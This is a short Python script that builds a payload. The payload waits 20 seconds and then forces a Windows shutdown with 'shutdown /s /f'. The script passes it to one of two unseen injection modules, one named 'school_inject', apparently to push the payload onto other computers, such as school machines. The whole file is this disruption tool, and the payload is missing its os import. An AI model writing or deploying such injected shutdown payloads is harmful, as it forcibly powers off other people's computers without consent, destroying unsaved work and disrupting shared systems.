import school_inject, inject
program="""
import time
time.sleep(20)
os.system('shutdown /s /f')
"""
a=input()
if a=='0':
    school_inject.run(program)
else:
    inject.run(program)
a=input()
